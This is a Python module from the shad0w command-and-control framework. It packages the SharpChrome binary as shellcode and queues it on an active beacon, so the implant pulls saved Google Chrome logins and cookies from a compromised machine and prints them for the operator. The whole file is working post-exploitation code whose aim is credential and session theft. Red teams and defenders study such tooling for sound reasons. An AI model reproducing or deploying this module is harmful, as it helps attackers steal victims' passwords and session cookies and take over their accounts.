#
# Execute sharpchrome on a session
#

import argparse

from lib import shellcode

__description__ = "Retrieve saved logins and cookies from Google Chrome"
__author__ = "@_batsec_, @harmj0y"
__type__ = "enumeration"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of Sharpchrome binary
SHARPCHROME_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SharpChrome.exe"


class DummyClass(object):
    # little hack but lets us pass the args to Donut
    def __init__(self):
        pass


def sharpchrome_callback(shad0w, data):
    print(data)

    return ""


def usage():
    pass


def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon.", log=True)
        return

    sharpchrome_args = ' '.join(args[1:])

    # kind of a hack to make sure we integrate nice with the shellcode generator
    args = DummyClass()

    if len(sharpchrome_args) != 0:
        args.param = sharpchrome_args
    else:
        args.param = False
        sharpchrome_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    b64_comp_data = shellcode.generate(SHARPCHROME_BIN, args, sharpchrome_args)

    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[shad0w.current_beacon]["callback"] = sharpchrome_callback
